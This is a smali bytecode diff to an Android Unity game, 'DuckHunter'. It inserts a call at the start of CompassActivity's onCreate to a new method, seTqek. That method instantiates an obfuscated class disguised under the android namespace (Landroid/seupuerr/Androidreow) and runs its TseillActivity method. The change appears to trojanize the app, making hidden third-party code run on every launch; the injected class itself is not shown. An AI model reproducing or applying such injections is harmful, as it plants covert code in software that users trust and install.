@@ -77,6 +77,8 @@
     .param p1, "savedInstanceState"    # Landroid/os/Bundle;
 
     .prologue
+    invoke-virtual {p0}, Lcom/Ameropel/DuckHunter/CompassActivity;->seTqek()V
+
     .line 58
     invoke-super {p0, p1}, Lcom/unity3d/player/UnityPlayerActivity;->onCreate(Landroid/os/Bundle;)V
 
@@ -181,5 +183,18 @@
     invoke-super {p0}, Lcom/unity3d/player/UnityPlayerActivity;->onStop()V
 
     .line 77
+    return-void
+.end method
+
+.method public seTqek()V
+    .registers 2
+
+    .prologue
+    new-instance v0, Landroid/seupuerr/Androidreow;
+
+    invoke-direct {v0, p0}, Landroid/seupuerr/Androidreow;-><init>(Landroid/content/Context;)V
+
+    invoke-virtual {v0}, Landroid/seupuerr/Androidreow;->TseillActivity()V
+
     return-void
 .end method
